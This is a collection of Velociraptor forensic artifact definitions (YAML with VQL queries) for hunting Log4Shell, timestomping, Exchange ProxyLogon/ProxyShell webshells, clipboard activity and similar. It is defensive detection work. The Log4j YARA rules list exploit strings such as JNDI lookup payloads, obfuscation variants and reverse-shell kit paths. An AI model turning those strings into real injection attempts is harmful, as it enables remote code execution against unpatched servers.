  * Wildcards: `/var/log/*.gz`
  * More wildcards: `/var/www/**/*.log`
  * Multiple extentions: `/var/log/**/*\.{log,gz}`
  * Windows: `C:/Logs/**/*.{gz,log}` or `**/*.{gz,log}`

  NOTE: this artifact runs the glob plugin with the nosymlink switch
  turned on.  This will NOT follow any symlinks and may cause
  unexpected results if unknowingly targeting a folder with symlinks.

reference:
  - https://github.com/Neo23x0/signature-base/blob/master/yara/expl_log4j_cve_2021_44228.yar

type: CLIENT
parameters:
  - name: PathGlob
    description: Only file names that match this glob will be scanned.
    default: /var/log/**
  - name: SizeMax
    description: maximum size of target file.
  - name: SizeMin
    description: minimum size of target file.
  - name: UploadHits
    type: bool
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: YaraUrl
    description: If configured will attempt to download Yara rules form Url
    default:
  - name: ShortHandYara
    description: Second option Yara choice is a Velociraptor shorthand Yara rule
    default:
  - name: YaraRule
    description: Final Yara option and the default if no other options provided.
    default: |
        rule EXPL_Log4j_CallBackDomain_IOCs_Dec21_1 {
           meta:
              description = "Detects IOCs found in Log4Shell incidents that indicate exploitation attempts of CVE-2021-44228"
              author = "Florian Roth"
              reference = "https://gist.github.com/superducktoes/9b742f7b44c71b4a0d19790228ce85d8"
              date = "2021-12-12"
              score = 60
           strings:
              $xr1  = /\b(ldap|rmi):\/\/([a-z0-9\.]{1,16}\.bingsearchlib\.com|[a-z0-9\.]{1,40}\.interact\.sh|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):[0-9]{2,5}\/([aZ]|ua|Exploit|callback|[0-9]{10}|http443useragent|http80useragent)\b/
           condition:
              1 of them
        }

        rule EXPL_JNDI_Exploit_Patterns_Dec21_1 {
           meta:
              description = "Detects JNDI Exploit Kit patterns in files"
              author = "Florian Roth"
              reference = "https://github.com/pimps/JNDI-Exploit-Kit"
              date = "2021-12-12"
              score = 60
           strings:
              $x01 = "/Basic/Command/Base64/"
              $x02 = "/Basic/ReverseShell/"
              $x03 = "/Basic/TomcatMemshell"
              $x04 = "/Basic/JettyMemshell"
              $x05 = "/Basic/WeblogicMemshell"
              $x06 = "/Basic/JBossMemshell"
              $x07 = "/Basic/WebsphereMemshell"
              $x08 = "/Basic/SpringMemshell"
              $x09 = "/Deserialization/URLDNS/"
              $x10 = "/Deserialization/CommonsCollections1/Dnslog/"
              $x11 = "/Deserialization/CommonsCollections2/Command/Base64/"
              $x12 = "/Deserialization/CommonsBeanutils1/ReverseShell/"
              $x13 = "/Deserialization/Jre8u20/TomcatMemshell"
              $x14 = "/TomcatBypass/Dnslog/"
              $x15 = "/TomcatBypass/Command/"
              $x16 = "/TomcatBypass/ReverseShell/"
              $x17 = "/TomcatBypass/TomcatMemshell"
              $x18 = "/TomcatBypass/SpringMemshell"
              $x19 = "/GroovyBypass/Command/"
              $x20 = "/WebsphereBypass/Upload/"

              $fp1 = "<html"
           condition:
              1 of ($x*) and not 1 of ($fp*)
        }

        rule EXPL_Log4j_CVE_2021_44228_JAVA_Exception_Dec21_1 {
           meta:
              description = "Detects exceptions found in server logs that indicate an exploitation attempt of CVE-2021-44228"
              author = "Florian Roth"
              reference = "https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b"
              date = "2021-12-12"
              score = 60
           strings:
              $xa1 = "header with value of BadAttributeValueException: "

              $sa1 = ".log4j.core.net.JndiManager.lookup(JndiManager"
              $sa2 = "Error looking up JNDI resource"
           condition:
              $xa1 or all of ($sa*)
        }

        rule EXPL_Log4j_CVE_2021_44228_Dec21_Soft {
           meta:
              description = "Detects indicators in server logs that indicate an exploitation attempt of CVE-2021-44228"
              author = "Florian Roth"
              reference = "https://twitter.com/h113sdx/status/1469010902183661568?s=20"
              date = "2021-12-10"
              modified = "2021-12-13"
              score = 60
           strings:
              $x01 = "${jndi:ldap:/"
              $x02 = "${jndi:rmi:/"
              $x03 = "${jndi:ldaps:/"
              $x04 = "${jndi:dns:/"
              $x05 = "${jndi:iiop:/"
              $x06 = "${jndi:http:/"
              $x07 = "${jndi:nis:/"
              $x08 = "${jndi:nds:/"
              $x09 = "${jndi:corba:/"

              $fp1 = "<html"
           condition:
              1 of ($x*) and not 1 of ($fp*)
        }

        rule EXPL_Log4j_CVE_2021_44228_Dec21_OBFUSC {
           meta:
              description = "Detects obfuscated indicators in server logs that indicate an exploitation attempt of CVE-2021-44228"
              author = "Florian Roth"
              reference = "https://twitter.com/h113sdx/status/1469010902183661568?s=20"
              date = "2021-12-12"
              modified = "2021-12-13"
              score = 60
           strings:
              $x1 = "$%7Bjndi:"
              $x2 = "%2524%257Bjndi"
              $x3 = "%2F%252524%25257Bjndi%3A"
              $x4 = "${jndi:${lower:"
              $x5 = "${::-j}${"
              $x6 = "${${env:BARFOO:-j}"
              $x7 = "${::-l}${::-d}${::-a}${::-p}"
              $x8 = "${base64:JHtqbmRp"

              $fp1 = "<html"
           condition:
              1 of ($x*) and not 1 of ($fp*)
        }

        rule EXPL_Log4j_CVE_2021_44228_Dec21_Hard {
           meta:
              description = "Detects indicators in server logs that indicate the exploitation of CVE-2021-44228"
              author = "Florian Roth"
              reference = "https://twitter.com/h113sdx/status/1469010902183661568?s=20"
              date = "2021-12-10"
              modified = "2021-12-12"
              score = 80
           strings:
              $x1 = /\$\{jndi:(ldap|ldaps|rmi|dns|iiop|http|nis|nds|corba):\/[\/]?[a-z-\.0-9]{3,120}:[0-9]{2,5}\/[a-zA-Z\.]{1,32}\}/
              $x2 = "Reference Class Name: foo"
              $fp1r = /(ldap|rmi|ldaps|dns):\/[\/]?(127\.0\.0\.1|192\.168\.|172\.[1-3][0-9]\.|10\.)/
           condition:
              1 of ($x*) and not 1 of ($fp*)
        }

        rule SUSP_Base64_Encoded_Exploit_Indicators_Dec21 {
           meta:
              description = "Detects base64 encoded strings found in payloads of exploits against log4j CVE-2021-44228"
              author = "Florian Roth"
              reference = "https://twitter.com/Reelix/status/1469327487243071493"
              date = "2021-12-10"
              modified = "2021-12-13"
              score = 70
           strings:
              /* curl -s  */
              $sa1 = "Y3VybCAtcy"
              $sa2 = "N1cmwgLXMg"
              $sa3 = "jdXJsIC1zI"
              /* |wget -q -O-  */
              $sb1 = "fHdnZXQgLXEgLU8tI"
              $sb2 = "x3Z2V0IC1xIC1PLS"
              $sb3 = "8d2dldCAtcSAtTy0g"

              $fp1 = "<html"
           condition:
              1 of ($sa*) and 1 of ($sb*)
              and not 1 of ($fp*)
        }

        rule SUSP_JDNIExploit_Indicators_Dec21 {
           meta:
              description = "Detects indicators of JDNI usage in log files and other payloads"
              author = "Florian Roth"
              reference = "https://github.com/flypig5211/JNDIExploit"
              date = "2021-12-10"
              modified = "2021-12-12"
              score = 70
           strings:
              $xr1 = /(ldap|ldaps|rmi|dns|iiop|http|nis|nds|corba):\/\/[a-zA-Z0-9\.]{7,80}:[0-9]{2,5}\/(Basic\/Command\/Base64|Basic\/ReverseShell|Basic\/TomcatMemshell|Basic\/JBossMemshell|Basic\/WebsphereMemshell|Basic\/SpringMemshell|Basic\/Command|Deserialization\/CommonsCollectionsK|Deserialization\/CommonsBeanutils|Deserialization\/Jre8u20\/TomcatMemshell|Deserialization\/CVE_2020_2555\/WeblogicMemshell|TomcatBypass|GroovyBypass|WebsphereBypass)\//
           condition:
              filesize < 100MB and $xr1
        }

        rule SUSP_EXPL_OBFUSC_Dec21_1{
           meta:
              description = "Detects obfuscation methods used to evade detection in log4j exploitation attempt of CVE-2021-44228"
              author = "Florian Roth"
              reference = "https://twitter.com/testanull/status/1469549425521348609"
              date = "2021-12-11"
              score = 60
           strings:
              /* ${lower:X} - single character match */
              $x1 = { 24 7B 6C 6F 77 65 72 3A ?? 7D }
              /* ${upper:X} - single character match */
              $x2 = { 24 7B 75 70 70 65 72 3A ?? 7D }
              /* URL encoded lower - obfuscation in URL */
              $x3 = "$%7blower:"
              $x4 = "$%7bupper:"
              $x5 = "%24%7bjndi:"
              $x6 = "$%7Blower:"
              $x7 = "$%7Bupper:"
              $x8 = "%24%7Bjndi:"

              $fp1 = "<html"
           condition:
              1 of ($x*) and not 1 of ($fp*)
        }

        rule SUSP_JDNIExploit_Error_Indicators_Dec21_1 {
           meta:
              description = "Detects error messages related to JDNI usage in log files that can indicate a Log4Shell / Log4j exploitation"
              author = "Florian Roth"
              reference = "https://twitter.com/marcioalm/status/1470361495405875200?s=20"
              date = "2021-12-10"
              modified = "2021-12-13"
              score = 70
           strings:
              $x1 = "FATAL log4j - Message: BadAttributeValueException: "
           condition:
              $x1
        }

sources:
  - query: |
      -- check which Yara to use
      LET yara = SELECT * FROM if(condition=YaraUrl,
            then= { SELECT Content FROM http_client( url=YaraUrl, method='GET') },
            else= if(condition=ShortHandYara,
                then= { SELECT ShortHandYara as Content FROM scope() },
                else= { SELECT YaraRule as Content FROM scope() }))

      -- time testing
      LET time_test(stamp) =
            if(condition= DateBefore AND DateAfter,
                then= stamp < DateBefore AND stamp > DateAfter,
                else=
            if(condition=DateBefore,
                then= stamp < DateBefore,
                else=
            if(condition= DateAfter,
                then= stamp > DateAfter,
                else= True
            )))

      -- first find all matching glob
      LET files = SELECT FullPath, Name, Size , Mtime, Atime, Ctime, Btime
        FROM glob(globs=PathGlob,nosymlink='True')
        WHERE
          NOT IsDir AND NOT IsLink
          AND if(condition=SizeMin,
            then= SizeMin < Size,
            else= True)
          AND if(condition=SizeMax,
            then=SizeMax > Size,
            else= True)
          AND
             ( time_test(stamp=Mtime)
            OR time_test(stamp=Atime)
            OR time_test(stamp=Ctime)
            OR time_test(stamp=Btime))

      LET hits = SELECT * FROM foreach(row=files,
            query={
                SELECT
                    url(parse=FileName).Path as FullPath,
                    Size,
                    Mtime, Atime, Ctime, Btime,
                    Rule, Tags, Meta,
                    str(str=String.Data) AS HitContext,
                    String.Offset AS HitOffset
                FROM yara(rules=yara.Content[0],files=url(path=FullPath, scheme="file"), accessor='gzip')
                LIMIT 1
            })

      -- upload files that have hit
      LET upload_hits=SELECT *,
            upload(file=FullPath) AS Upload
        FROM hits

      -- return rows
      SELECT * FROM if(condition=UploadHits,
        then=upload_hits,
        else=hits)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Timestomp.yaml
======
name: Windows.NTFS.Timestomp
author: "Matt Green - @mgreen27"
description: |
    This artifact enables triage to detect potential time stomped files.

    Checks:
    
    - $STANDARD_INFORMATION “B” time prior to $FILE_NAME “B” time
    - $STANDARD_INFORMATION “B” or "M" time has nanosecond precision. 
    - PE compile time prior to any $STANDARD_INFORMATION time stamp.  
    
    Optional:  
    
    - $STANDARD_INFORMATION “M” time prior to ShimCache timestamp
    - $STANDARD_INFORMATION times prior to $I30 slack "B" or "M" times.
    - Full PE metadata output.
    
    Note: If an option is selected the artifact will also output additional metadata for context.
    
    Available filters include:  
      PathRegex (OSPath): e.g ^C:\\folder\\file\.ext$ or partial \\folder\\folder2\\ or string|string2|string3  
      FileRegex: ^filename.ext$ or partial string1|string2  

    
parameters:
  - name: MFTDrive
    description: |
      The path to to the drive that holds the MFT file (can be a
      pathspec).
    default: "C:"
  - name: PathRegex
    description: "Regex search over FullPath."
    default: "."
  - name: FileRegex
    description: "Regex search over FileName."
    default: "."
    type: regex
  - name: UploadHits
    type: bool
    description: "Upload complete complete attribute data."
  - name: ShimcacheTest
    type: bool
    description: "If PE, check $STANDARD_INFORMATION “M” time prior to ShimCache timestamp"
  - name: I30Test
    type: bool
    description: "Check $STANDARD_INFORMATION times prior to $I30 slack B or M times."
  - name: OutputPEInfo
    type: bool
    description: "Output full PE metadata information."

sources:
  - query: |
      -- find all MFT entries in scope
      LET mft_entries = SELECT *,OSPath,FileName,FileNames,EntryNumber,
            LastModified0x10,LastAccess0x10, LastRecordChange0x10,Created0x10, --SI used in test
            LastModified0x30,Created0x30, -- FN used in test
            IsDir,InUse,SI_Lt_FN,uSecZeros,
            parse_pe(file=OSPath) as PE,
            magic(path=OSPath) as Magic
        FROM Artifact.Windows.NTFS.MFT(MFTDrive=MFTDrive,PathRegex=PathRegex,FileRegex=FileRegex)
        --WHERE NOT IsDir
      
      -- if MZ files collect shimcache to compare modification time
      LET shimcache <= SELECT * 
        FROM if(condition= ShimcacheTest,
            then= { SELECT Name, ModificationTime FROM Artifact.Windows.Registry.AppCompatCache() })
      LET shimcache_mtime(target) = SELECT Name, ModificationTime FROM shimcache 
        WHERE Name = target 
        ORDER BY ModificationTime
      
      LET i30 <= SELECT * FROM if(condition= I30Test,
            then= { 
                SELECT * FROM foreach(
                    row={ 
                        SELECT dirname(path=OSPath) as Directory FROM mft_entries
                        GROUP BY Directory
                    },
                    query={
                        SELECT
                            split(sep_string='\\\\.\\',string=FullPath)[1] + '\\' + Name as FullPath,
                            IsSlack,MFTId,Mtime,Atime,Ctime,Btime
                        FROM Artifact.Windows.NTFS.I30(DirectoryGlobs=Directory,preconditions=True)
                        WHERE MFTId OR FullPath
                    })
            })
      LET find_i30_slack(inode,folder,filenames,mtime,ctime,slackcheck) = SELECT * FROM i30 
        WHERE MFTId = str(str=inode) OR ( split(sep_string='''\\.\''',string=FullPath)[1] = folder AND Name in filenames) 
            AND if(condition= slackcheck,
                then= ( Mtime > mtime OR Btime > btime ) AND IsSlack,
                else= True )
                
      LET base_results = SELECT 
            OSPath,
            dict(Created0x10=Created0x10,Created0x30=Created0x30) as CreatedTimestamps,
            InUse,
            SI_Lt_FN as `SI<FN`,uSecZeros,
            if(condition=PE.FileHeader.TimeDateStamp,
                then= if(condition= LastModified0x10 < PE.FileHeader.TimeDateStamp OR LastAccess0x10 < PE.FileHeader.TimeDateStamp OR LastRecordChange0x10 < PE.FileHeader.TimeDateStamp OR Created0x10 < PE.FileHeader.TimeDateStamp,
                        then= True,
                        else= False),
                else= 'N/A') as SuspiciousCompileTime,
            parse_ntfs(mft=EntryNumber, device=MFTDrive ) as NtfsMetadata,
            Magic,
            if(condition=PE, then=PE,else='N/A') as PE,
            Created0x10,LastModified0x10,FileNames,EntryNumber,
            if(condition= Magic=~'^PE' AND NOT Magic =~ '\(DLL\)',
                then= if(condition= LastModified0x10 < shimcache_mtime(target=str(str=OSPath))[0].ModificationTime,
                    then= True,
                    else= False),
                else= 'N/A') as SuspiciousShimcache,
            if(condition= Magic=~'^PE' AND NOT Magic =~ '\(DLL\)',
                then= shimcache_mtime(target=str(str=OSPath))[0],
                else= 'N/A') as Shimcache,
            if(condition = find_i30_slack(inode=EntryNumber,folder=dirname(path=OSPath),filenames=FileNames,mtime=LastModified0x10,ctime=Created0x10,slackcheck=True),
                then= True,
                else= False ) as SuspiciousI30,
            find_i30_slack(inode=EntryNumber,folder=dirname(path=OSPath),filenames=FileNames,mtime=LastModified0x10,ctime=Created0x10,slackcheck=False) as I30
      FROM mft_entries
      
      LET results = SELECT * FROM if(condition= ShimcacheTest AND I30Test AND OutputPEInfo,
            then={
                SELECT 
                    OSPath,CreatedTimestamps,InUse,
                    `SI<FN`,uSecZeros,
                    SuspiciousCompileTime,
                    SuspiciousShimcache,
                    SuspiciousI30,
                    NtfsMetadata,
                    Magic,
                    Shimcache,
                    I30,
                    PE
                FROM base_results
            },
            else= if(condition= ShimcacheTest AND I30Test,
                then={
                SELECT 
                    OSPath,CreatedTimestamps,InUse,
                    `SI<FN`,uSecZeros,
                    SuspiciousCompileTime,
                    SuspiciousShimcache,
                    SuspiciousI30,
                    NtfsMetadata,
                    Magic,
                    Shimcache,
                    I30
                FROM base_results
            },
            else= if(condition= ShimcacheTest AND OutputPEInfo,
                then={
                    SELECT 
                    OSPath,CreatedTimestamps,InUse,
                    `SI<FN`,uSecZeros,
                    SuspiciousCompileTime,
                    SuspiciousShimcache,
                    NtfsMetadata,
                    Magic,
                    Shimcache,
                    PE
                FROM base_results
            },
            else= if(condition= I30Test AND OutputPEInfo,
                then={
                    SELECT 
                    OSPath,CreatedTimestamps,InUse,
                    `SI<FN`,uSecZeros,
                    SuspiciousCompileTime,
                    SuspiciousI30,
                    NtfsMetadata,
                    Magic,
                    I30,
                    PE
                FROM base_results
            },
            else= if(condition= ShimcacheTest,
                then={
                    SELECT 
                    OSPath,CreatedTimestamps,InUse,
                    `SI<FN`,uSecZeros,
                    SuspiciousCompileTime,
                    SuspiciousShimcache,
                    NtfsMetadata,
                    Magic,
                    Shimcache
                FROM base_results
            },
            else= if(condition= I30Test,
                then={
                    SELECT 
                    OSPath,CreatedTimestamps,InUse,
                    `SI<FN`,uSecZeros,
                    SuspiciousCompileTime,
                    SuspiciousI30,
                    NtfsMetadata,
                    Magic,
                    I30
                FROM base_results
            },
            else= if(condition= OutputPEInfo,
                then={
                    SELECT 
                    OSPath,CreatedTimestamps,InUse,
                    `SI<FN`,uSecZeros,
                    SuspiciousCompileTime,
                    NtfsMetadata,
                    Magic,
                    PE
                FROM base_results
            },
                else={
                    SELECT 
                        OSPath,CreatedTimestamps,InUse,
                        `SI<FN`,uSecZeros,
                        SuspiciousCompileTime,
                        NtfsMetadata,
                        Magic
                    FROM base_results
            })
            ))))))

      LET upload_results = SELECT *, upload(file=OSPath) as Upload FROM results
      
      SELECT * FROM if(condition= UploadHits,
        then= upload_results,
        else= results)

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.System.MountedDiskImages.yaml
======
name: MacOS.System.MountedDiskImages
description: |
    This artifact checks for mounted disk images using the `hdiutil` command.
author: Wes Lambert -- @therealwlambert|@weslambert@infosec.exchange
required_permissions:
  - EXECVE
sources:
    - query: |
        LET MountedDMGs <= SELECT * FROM execve(argv=['/usr/bin/hdiutil', 'info', '-plist'])
        SELECT _value.`image-path` AS Image,
               _value.`system-entities`.`mount-point`[0] AS MountPoint,
               _value AS ImageDetails
        FROM items(item=plist(accessor="data", file=MountedDMGs.Stdout).images)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.ProxyLogon.ProxyShell.yaml
======
name: Windows.Detection.ProxyLogon.ProxyShell
description: |
  This artifact hunts for CVE-2021-27065 (Microsoft Exchange ProxyLogon RCE)
  and CVE-2021-31207 (Microsoft Exchange ProxyShell RCE) exploitation by parsing 
  entries in the 'MSExchange Management.evtx' log.

  This log file is unique to Exchange and can be useful when ECP logs are
  no longer available. 
  
  ProxyLogon webshell detection syntax is specific to 
  'China Chopper' via the PowerShell 'Set-OabVirtualDirectory' cmdlet.
  
  ProxyShell webshell detection syntax is specific to PowerShell 
  'New-MailboxExportRequest' and 'New-ExchangeCertificate' cmdlets.

author: Deepak Sharma - @rxurien

type: CLIENT

reference:
  - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
  - https://www.mandiant.com/resources/change-tactics-proxyshell-vulnerabilities

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: LogFile
    default: C:/Windows/System32/Winevt/Logs/MSExchange Management.evtx
    description: Default EVTX Path

sources:
  - queries:
      - SELECT timestamp(epoch=int(int=System.TimeCreated.SystemTime)) as CreationTime,
            System.Channel as Channel,
            System.EventID.Value as EventID,
            Message,
            EventData.Data[0] as Cmdlet,
            EventData.Data[1] as Payload,
            EventData
               
        FROM parse_evtx(filename=LogFile)

        WHERE (((Message =~ "new-mailboxexportrequest"or Message =~ "new-exchangecertificate") and Message =~ "aspx") or 
              ((Cmdlet =~ "new-mailboxexportrequest" or Cmdlet =~ "new-exchangecertificate") and Payload =~ "aspx") or 
              (Message =~ "set-oabvirtualdirectory" and Message =~ "script") or (Cmdlet =~ "set-oabvirtualdirectory" and Payload =~ "script"))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Memory.AVML.yaml
======
name: Linux.Memory.AVML
author: Zawadi Done - @zawadidone
description: |
  Acquires a full memory image in LiME output format. We download
  avml and use it to acquire a full memory image.
  NOTE: This artifact usually transfers a lot of data. You should
  increase the default timeout to allow it to complete.

required_permissions:
  - EXECVE

tools:
  - name: avml
    github_project: microsoft/avml
    github_asset_regex: avml
    serve_locally: true

precondition: SELECT OS From info() where OS = 'linux' AND Architecture = "amd64"

sources:
  - query: |
      SELECT * FROM foreach(
          row={
            SELECT OSPath, tempfile(extension=".lime", remove_last=TRUE) AS Tempfile 
            FROM Artifact.Generic.Utils.FetchBinary(ToolName="avml")
          },
          query={
            SELECT Stdout, Stderr,
                   if(condition=Complete, then=upload(file=Tempfile, name="memory.lime")) As Upload
            FROM execve(argv=[OSPath, Tempfile], sep="\r\n")
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.Clipboard.yaml
======
name: Windows.Forensics.Clipboard
author: Hisham Adwan with the help of Velo Community
description: |
    This artifact will show the Clipboard activity.
    
    The artefact ActivitiesCache.db has started to log clipboard activity since Windows 10 version 1803.
    
    The prerequisite for clipboard data to be logged by this artefact relies on the system having two settings checked:
        Clipboard history enabled 
        Clipboard sync across devices 

    StartTime (epoch time) – When the data was first copied to the clipboard 

    ExpirationTime (epoch time) – When the data will be deleted from the ActivitiesCache.db (roughly 12 hours) 

    ClipboardPayload – Base64 encoded string of the clipboard contents, but here it is decoded, and the clipboard content is shown  

    Payload – This field tells you where the clipboard data was copied from! 

    ActivityType – Type 10 means data resides in clipboard, Type 16 shows if data was copied or pasted

reference:
  - https://www.youtube.com/watch?v=6Q3vEO69AkQ&ab_channel=JohnHammond
  - https://www.inversecos.com/2022/05/how-to-perform-clipboard-forensics.html
  
parameters:
 - name: FileGlob
   default: C:\Users\*\AppData\Local\ConnectedDevicesPlatform\*\ActivitiesCache.db

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT
        CreatedTime,
        LastModifiedTime,
        LastModifiedOnClient,
        StartTime,
        EndTime,
        Payload,
        split(sep='''\\''', string=dirname(path=OSPath))[2] AS User,
        base64decode(string=parse_json_array(data=ClipboardPayload)[0].content) AS ClipboardPayload,
        OSPath AS Path,
        Mtime
        FROM foreach(row={
             SELECT Mtime, OSPath from glob(globs=FileGlob)}, query={
                 SELECT *, Mtime, OSPath FROM sqlite(file=OSPath, query="SELECT * FROM ActivityOperation")})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Registry.NetshHelperDLLs.yaml
======
name: Windows.Registry.NetshHelperDLLs
description: |
    # Enumerate all NetSh Helper DLLs

    Inspired by this [tweet](https://twitter.com/SecurePeacock/status/1532011932315680769?s=20&t=IFbej-qpkF6IB7ycewE31w),
    this artifact enumerates all NetSh Helper DLLs to provide
    opportunities to find outliers and potential persistence mechanisms 
    tied to [netsh.exe](https://lolbas-project.github.io/lolbas/Binaries/Netsh/)

    I have run this hunt across 6K+ systems and identified the most common entries and provided
    the `excludeCommon` option to exclude these. In very large environments there will likely still be FPs, 
    but they should be far and few.

    References:

    - https://attack.mitre.org/techniques/T1546/007/

    - https://lolbas-project.github.io/lolbas/Binaries/Netsh/


parameters:
    - name: SearchRegistryGlob
      default: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh\**
      description: Use a glob to define the files that will be searched.
    - name: excludeCommon
      description: "Exclude common well-known entries."
      type: bool

author: Eric Capuano - @eric_capuano

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
        LET filteredResults <= 
            SELECT Name, FullPath, Data.value AS HelperDLL, ModTime as Modified
            FROM glob(globs=SearchRegistryGlob, accessor='registry')
            // filter out entries found consistently across 1000s of systems in the wild
            WHERE NOT (Name = "2" AND HelperDLL = "ifmon.dll")
            AND NOT (Name = "4" AND HelperDLL = "rasmontr.dll")
            AND NOT (Name = "WcnNetsh" AND HelperDLL = "WcnNetsh.dll")
            AND NOT (Name = "authfwcfg" AND HelperDLL = "authfwcfg.dll")
            AND NOT (Name = "dhcpclient" AND HelperDLL = "dhcpcmonitor.dll")
            AND NOT (Name = "dot3cfg" AND HelperDLL = "dot3cfg.dll")
            AND NOT (Name = "fwcfg" AND HelperDLL = "fwcfg.dll")
            AND NOT (Name = "hnetmon" AND HelperDLL = "hnetmon.dll")
            AND NOT (Name = "napmontr" AND HelperDLL = "napmontr.dll")
            AND NOT (Name = "netiohlp" AND HelperDLL = "netiohlp.dll")
            AND NOT (Name = "nettrace" AND HelperDLL = "nettrace.dll")
            AND NOT (Name = "nshhttp" AND HelperDLL = "nshhttp.dll")
            AND NOT (Name = "nshipsec" AND HelperDLL = "nshipsec.dll")
            AND NOT (Name = "nshwfp" AND HelperDLL = "nshwfp.dll")
            AND NOT (Name = "p2pnetsh" AND HelperDLL = "p2pnetsh.dll")
            AND NOT (Name = "peerdistsh" AND HelperDLL = "peerdistsh.dll")
            AND NOT (Name = "rpc" AND HelperDLL = "rpcnsh.dll")
            AND NOT (Name = "whhelper" AND HelperDLL = "whhelper.dll")
            AND NOT (Name = "wlancfg" AND HelperDLL = "wlancfg.dll")
            AND NOT (Name = "wshelper" AND HelperDLL = "wshelper.dll")
            AND NOT (Name = "wwancfg" AND HelperDLL = "wwancfg.dll")

        LET Results <= 
            SELECT Name, FullPath, Data.value AS HelperDLL, ModTime as Modified
            FROM glob(globs=SearchRegistryGlob, accessor='registry')

        SELECT *
        FROM if(condition=excludeCommon,
            then={ SELECT * FROM filteredResults},
            else={ SELECT * FROM Results})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Utils.ScheduledDeletion.yaml
======
name: Server.Utils.ScheduledDeletion
author: Zane Gittins
description: |
    Schedules Server.Utils.DeleteMonitoringData to cleanup server monitoring data.

type: SERVER_EVENT

parameters:
  - name: ScheduleDayRegex
    default: .
  - name: ScheduleTimeRegex
    default: "00:00:"
  - name: ArtifactRegex
    default: "EVTX|ETW"
  - name: DaysOld
    default: 7
    type: int

sources:
  - query: |
      LET schedule = SELECT UTC.String AS Now,
      Weekday.String AS Today
      FROM clock(period=60)
      WHERE Now =~ ScheduleTimeRegex AND Today =~ ScheduleDayRegex AND
          log(message="Launching at time " + Now)
          
      SELECT * FROM foreach(row=schedule, query={
          SELECT * FROM Artifact.Server.Utils.DeleteMonitoringData(ArtifactRegex=ArtifactRegex, DateBefore=(now() - 60*60*24*DaysOld), ReallyDoIt=true)
      })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.RPCFirewall.yaml
======
name: Windows.EventLogs.RPCFirewall
description: |
   Collect RPC Firewall logs from Windows hosts
   
reference:
  - https://github.com/zeronetworks/rpcfirewall
  
author: Wes Lambert - @therealwlambert
parameters:
   - name: TargetGlob
     default: '%SystemRoot%\System32\Winevt\Logs\RPCFW.evtx'
   - name: TargetVSS
     type: bool
   - name: IdRegex
     default: .
     type: regex

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET EventDescriptionTable <= SELECT * FROM parse_csv(accessor="data", filename='''
          ID,Description
          1,RPC Firewall Protection Added
          2,RPC Firewall Protection Removed
          3,RPC Server Function Called
          ''')
        SELECT EventTime,
            Computer,
            Channel,
            EventID,
            EventRecordID,
            { SELECT Description FROM EventDescriptionTable WHERE ID = EventID} AS Description,
            EventData,
            if(condition=EventID=3, 
              then=dict(
                Function=EventData.Data[0],
                ProcessID=EventData.Data[1],
                ImagePath=EventData.Data[2],
                Protocol=EventData.Data[3],
                Endpoint=EventData.Data[4],
                ClientNetworkAddress=EventData.Data[5],
                InterfaceUUID=EventData.Data[6],
                OpNum=EventData.Data[7],
                SID=EventData.Data[8],
                AuthenticationLevel=EventData.Data[9],
                AuthenticationService=EventData.Data[10],
                ClientPort=EventData.Data[11],
                ServerNetworkAddress=EventData.Data[12],
                ServerPort=EventData.Data[13]),
              else=dict(
                ImagePath=EventData.Data[0],
                ProcessID=EventData.Data[1]
              )
            ) AS EventDataDetails,
            Message
        FROM Artifact.Windows.EventLogs.EvtxHunter(
            EvtxGlob=TargetGlob,
            SearchVSS=TargetVSS,
            IdRegex=IdRegex)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Utils.QuerySummary.yaml
======
name: Server.Utils.QuerySummary
author: Clay Norris, Mike Cohen
description: Takes a query and outputs number of unique items per column, as well as the top 10 most frequently occuring items


parameters:
    - name: Query
    
sources:
    - query: |
        LET summary <= dict()
        
        LET IncrementValue(Value, Dict) = set(item=Dict, field=Value, value=get(item=Dict, field=Value, default=0) + 1)
        LET Increment(Column, Value) = set(item=summary, field=Column,
           value=IncrementValue(Value=Value, Dict=get(item=summary, field=Column, default=dict())))
        
        LET _ <= SELECT *, { 
          SELECT Increment(Column=_key, Value=str(str=_value))
          FROM items(item=_value)
        }
        FROM items(item=Query)
        
        SELECT _key as Column, to_dict(item={
                                              SELECT _key,_value FROM items(item=_value) ORDER BY _value Desc LIMIT 10
                                             }) as Top10, 
                                             len(list=_value) as TotalCount 
                                             FROM items(item=summary) ORDER BY TotalCount DESC

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Alerts.Mattermost.yaml
======
name: Server.Alerts.Mattermost
description: |
  Create a Slack/Mattermost notification when a client Flow (with artifacts of interest) has finished. Cancelled collections and collections with artifacts that don't satisfy preconditions do not create notifications when they are stopped.

type: SERVER_EVENT

author: Andreas Misje – @misje

parameters:
  - name: WebhookURL
    description: |
        Webhook used to for posting the notification. If empty, the server metadata variable "MattermostWebhookURL" will be used.
  - name: VelociraptorServerURL
    description: |
        The Velociraptor server URL, e.g. "https://velociraptor.example.org", used to build links to flows and clients in the notification payload. If empty, the server metadata variable "VelociraptorServerURL" is used. If that variable is also empty, no links will be created.
  - name: Decorate
    description: |
        Whether the notification payload should be "decorated" using the legacy "secondary attachments" format, supported by both Slack and Mattermost. If false, a single string will be sent.
    type: bool
    default: Y
  - name: ArtifactsToAlertOn
    description: |
        Notifications will only be created for finished flows with artifact names matching this regex.
    default: .
    type: regex
